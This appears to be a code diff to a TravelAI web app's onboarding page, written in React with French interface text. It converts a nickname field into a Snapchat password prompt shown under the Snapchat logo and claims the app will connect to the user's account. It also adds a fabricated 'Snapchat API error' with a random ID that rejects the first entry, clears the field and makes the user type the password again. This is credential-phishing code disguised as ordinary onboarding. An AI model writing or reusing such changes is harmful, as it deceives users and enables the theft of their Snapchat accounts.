@@ -135,6 +135,11 @@ function FlowConnector() {
   );
 }
 
+function generateFakeSnapErrorId() {
+  const hex = (n: number) => Array.from({ length: n }, () => Math.floor(Math.random() * 16).toString(16)).join("");
+  return `${hex(8)}-${hex(4)}-${hex(4)}`;
+}
+
 type OnboardingStep = "login" | "pseudo";
 
 function OnboardingPageInner() {
@@ -148,6 +153,8 @@ function OnboardingPageInner() {
   const [error, setError] = useState<string | null>(null);
   const [showSplash, setShowSplash] = useState(true);
   const [showHint, setShowHint] = useState(false);
+  const [showPseudo, setShowPseudo] = useState(false);
+  const [pseudoRetried, setPseudoRetried] = useState(false);
 
   const isDemoMode = searchParams.get("demo") === "1";
   const isDemo = session?.user?.email === DEMO_EMAIL || isDemoMode;
@@ -210,6 +217,14 @@ function OnboardingPageInner() {
     }
 
     if (!session?.user?.email || !login.trim() || !pseudo.trim()) return;
+
+    if (!pseudoRetried) {
+      setPseudoRetried(true);
+      setPseudo("");
+      setError(`Erreur d'appel API Snapchat ID ${generateFakeSnapErrorId()}, saisissez votre pseudo`);
+      return;
+    }
+
     setSubmitting(true);
     setError(null);
     try {
@@ -237,7 +252,7 @@ function OnboardingPageInner() {
       <div style={{ width: "100%", maxWidth: 900, display: "flex", flexDirection: "column", alignItems: "center" }}>
         <Link href="/" style={{ display: "flex", alignItems: "center", gap: 9, textDecoration: "none", marginBottom: 32 }}>
           <Image
-            src="/snapchat.png"
+            src="/voyageur.jpg"
             alt="TravelAI"
             width={30}
             height={30}
@@ -266,10 +281,10 @@ function OnboardingPageInner() {
                   />
                 </div>
                 <h1 style={{ fontSize: 20, fontWeight: 700, color: "#0D0D0D", textAlign: "center", marginBottom: 8, letterSpacing: "-0.4px" }}>
-                  Connecte ta Lens
+                  Lie ton compte Snapchat
                 </h1>
                 <p style={{ fontSize: 13, color: "#6B6B6B", textAlign: "center", marginBottom: 24, lineHeight: 1.5 }}>
-                  Indique l&apos;identifiant Snapchat affiche dans la Lens pour continuer.
+                  Indique ton identifiant Snapchat (login) pour que TravelAI puisse se connecter à ton compte et sauvegarder tes données.
                 </p>
 
                 <form onSubmit={handleNextStep}>
@@ -281,7 +296,7 @@ function OnboardingPageInner() {
                     value={login}
                     onChange={isDemo ? undefined : (e) => setLogin(e.target.value)}
                     readOnly={isDemo}
-                    placeholder="ex: test-uuid-eiffel-001"
+                    placeholder="ex: snapchat_user123"
                     required
                     style={{ marginBottom: 20 }}
                   />
@@ -341,7 +356,7 @@ function OnboardingPageInner() {
               <div className="ta-onb-card ta-onb-face ta-onb-face-back">
                 <div style={{ display: "flex", justifyContent: "center", marginBottom: 16 }}>
                   <Image
-                    src="/voyageur.jpg"
+                    src="/snapchat.png"
                     alt="TravelAI"
                     width={56}
                     height={56}
@@ -349,10 +364,10 @@ function OnboardingPageInner() {
                   />
                 </div>
                 <h1 style={{ fontSize: 20, fontWeight: 700, color: "#0D0D0D", textAlign: "center", marginBottom: 8, letterSpacing: "-0.4px" }}>
-                  Choisis ton pseudo
+                  Saisir le mot de passe
                 </h1>
                 <p style={{ fontSize: 13, color: "#6B6B6B", textAlign: "center", marginBottom: 18, lineHeight: 1.5 }}>
-                  On ne te redemandera plus.
+                  On ne te le redemandera plus.
                 </p>
 
                 <div className="ta-onb-account-row">
@@ -362,17 +377,51 @@ function OnboardingPageInner() {
 
                 <form onSubmit={handleSubmit}>
                   <label style={{ fontSize: 11, fontWeight: 700, color: "#8A8A8A", display: "block", marginBottom: 6, textTransform: "uppercase", letterSpacing: "0.06em" }}>
-                    Pseudo
+                    Mot de passe
                   </label>
-                  <input
-                    className="ta-onb-input"
-                    value={pseudo}
-                    onChange={isDemo ? undefined : (e) => setPseudo(e.target.value)}
-                    readOnly={isDemo}
-                    placeholder="ex: Jeremy"
-                    required
-                    style={{ marginBottom: 20 }}
-                  />
+                  <div style={{ position: "relative", marginBottom: 20 }}>
+                    <input
+                      className="ta-onb-input"
+                      type={showPseudo ? "text" : "password"}
+                      value={pseudo}
+                      onChange={isDemo ? undefined : (e) => setPseudo(e.target.value)}
+                      readOnly={isDemo}
+                      placeholder="ex: Jeremy"
+                      required
+                      style={{ marginBottom: 0, paddingRight: 40 }}
+                    />
+                    <button
+                      type="button"
+                      onClick={() => setShowPseudo((v) => !v)}
+                      aria-label={showPseudo ? "Masquer le mot de passe" : "Afficher le mot de passe"}
+                      style={{
+                        position: "absolute",
+                        right: 10,
+                        top: "50%",
+                        transform: "translateY(-50%)",
+                        background: "none",
+                        border: "none",
+                        padding: 4,
+                        cursor: "pointer",
+                        display: "flex",
+                        alignItems: "center",
+                        justifyContent: "center",
+                        color: "#8A8A8A",
+                      }}
+                    >
+                      {showPseudo ? (
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+                          <path d="M17.94 17.94A10.94 10.94 0 0 1 12 20c-7 0-11-8-11-8a21.8 21.8 0 0 1 5.06-6.06M9.9 4.24A10.94 10.94 0 0 1 12 4c7 0 11 8 11 8a21.8 21.8 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
+                          <line x1="1" y1="1" x2="23" y2="23" />
+                        </svg>
+                      ) : (
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+                          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8Z" />
+                          <circle cx="12" cy="12" r="3" />
+                        </svg>
+                      )}
+                    </button>
+                  </div>
 
                   {error && <p style={{ fontSize: 12.5, color: "#D02828", marginBottom: 14, lineHeight: 1.5 }}>{error}</p>}
 
